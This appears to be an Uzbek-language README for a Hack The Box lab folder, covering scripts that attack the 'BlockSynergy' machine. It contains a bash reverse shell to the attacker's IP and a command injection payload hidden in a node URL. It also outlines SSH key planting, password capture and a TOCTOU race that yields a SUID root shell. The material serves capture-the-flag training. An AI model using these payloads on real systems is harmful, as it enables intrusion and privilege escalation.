# HTB BlockSynergy — ishchi papka

Bu papka BlockSynergy (HTB, Insane, Linux, `10.129.132.212`) uchun tayyor skriptlar.
**Faqat o'zingizning HTB VPN ulangan Kali mashinangizda ishlatiladi.**

Umumiy to'liq yo'l: [`../HTB_BlockSynergy_root_walkthrough.md`](../HTB_BlockSynergy_root_walkthrough.md)

## Fayllar

| Fayl | Vazifa |
|------|--------|
| `01_recon.sh` | /etc/hosts, tun0 MTU=1300, nmap port sweep + service scan |
| `02_web_chain.sh` | wallet → coin forge → VIP → SSRF (`0.0.0.0`) → `test_node` trigger |
| `mock_server.py` | Faqat lokal test uchun soxta ilova (real targetga tegmaydi) |
| `test_web_chain.sh` | `02_web_chain.sh` ni mock'ga qarshi sinaydigan regressiya testi |

## Ishlatish tartibi

```bash
# 1) Recon (root talab qiladi)
sudo ./01_recon.sh 10.129.132.212

# 2) Web zanjiri: wallet -> forge -> VIP -> SSRF
BASE=http://blocksynergy.htb:8080 ./02_web_chain.sh
```

Natijalar `./loot/` papkasiga tushadi:
`cookies.txt`, `wallet.json`, `reward.json`, `vip.html`, `register.html`,
`nodes.html`, `ssrf.html`.

## Skriptlar mock'ga qarshi tekshirilgan

`02_web_chain.sh` mantig'i real HTTP oqim bilan sinovdan o'tgan (mock ilova ustida):

```bash
./test_web_chain.sh
# -> PUB = MOCK_PUBKEY_...
# -> Added!
# -> NODE_ID = 1
# -> SSRF ISHLADI
# -> BARCHA TESTLAR O'TDI
```

Mock quyidagi haqiqiy endpointlarni taqlid qiladi:
- `POST /dashboard/wallet` → `{public_key, private_key}`
- `POST /broadcast_transaction` → `{"status":"Added!"}`
- `POST /dashboard/vip/nodes` (`action=register&node=...`)
- `GET  /dashboard/vip/nodes` → `testNode('N')` handlerlari bilan jadval
- `GET  /dashboard/vip/nodes/test_node/<id>` → admin panel kontenti

## Zanjirning qolgan qadamlari (qo'lda)

3-qadamdan keyin hali skriptlanmagan (payload targetga qarab sozlanishi kerak):

```bash
# 03. ping_node command injection -> shell as walter
LHOST=<VPN_TUN_IP>
CMD="bash -c 'bash -i >& /dev/tcp/$LHOST/4444 0>&1'"
B64=$(printf '%s' "$CMD" | base64 -w0)
nc -lvnp 4444
# node URL sifatida ro'yxatdan o'tkazing:
#   http://0.0.0.0:8080;echo${IFS}<B64>|base64${IFS}-d|bash;a@0.0.0.0:8080/admin/nodes/manage?action=ping_node&target=http://0.0.0.0:8080

# 04. smart contract debug hook path traversal -> hank ning ~/.ssh/authorized_keys
# 05. pspy -> root argv da FTP parol; /var/restore_work group-writable
# 06. sha256sum <-> tar TOCTOU -> inotify rename swap -> SUID root bash
/var/restore_work/bash -p -c 'id; cat /root/root.txt'
```

## Diqqat

- Werkzeug dev server single-threaded: katta thread bilan fuzzing qilmang (DoS bo'ladi).
- Node ID ro'yxat tartibiga teng emas — `02_web_chain.sh` buni URL bo'yicha aniqlaydi.
- SSH banner kelib keyin osilib qolsa — tun0 MTU 1300 qilib qo'ying.
